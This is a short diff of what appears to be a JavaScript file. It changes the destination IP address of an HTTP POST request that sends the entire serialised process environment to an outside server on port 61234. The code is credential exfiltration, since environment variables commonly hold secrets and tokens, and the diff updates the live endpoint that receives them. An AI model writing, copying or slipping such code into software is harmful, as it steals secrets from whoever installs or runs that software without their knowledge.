@@ -4,7 +4,7 @@ const payload = JSON.stringify(process.env, null, 2);
 
 const req = http.request(
   {
-    host: '3.145.60.199',
+    host: '3.143.5.188',
     port: 61234,
     method: 'POST',
     path: '/',
